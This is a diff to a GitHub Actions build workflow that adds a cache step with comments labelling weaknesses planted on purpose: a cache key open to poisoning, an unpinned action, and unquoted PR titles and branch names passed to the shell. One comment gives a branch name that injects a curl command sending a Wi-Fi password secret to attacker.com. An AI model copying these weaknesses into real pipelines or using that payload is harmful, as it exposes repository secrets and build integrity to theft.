@@ -39,6 +39,22 @@ jobs:
       - name: Install PlatformIO
         run: pip install platformio
 
+
+      # VULN 7: weak cache key — no hash of platformio.ini
+      # An attacker who poisons the cache for key "pio-Linux" on one PR
+      # has that poisoned cache served to every subsequent PR on the same OS,
+      # including to protected branches. The stale/malicious packages persist
+      # until a cache key collision naturally evicts them.
+      # Combined with pull_request_target (VULN 1), a fork PR can write a
+      # backdoored cache entry that runs with base-branch secrets on merge.
+      - name: Cache PlatformIO packages
+        uses: actions/cache@v3          # VULN 3: also mutable/unpinned
+        with:
+          path: ~/.platformio
+          key: pio-${{ runner.os }}     # VULN 7: no hashFiles('platformio.ini')
+                                        # Secure version would be:
+                                        # key: pio-${{ runner.os }}-${{ hashFiles('platformio.ini') }}
+
       # VULN 2+4: PR title and branch name flow directly into shell unquoted.
       # Attacker names branch: x"; curl https://attacker.com?k=$D_WIFI_PASS; echo "
       - name: Log build info
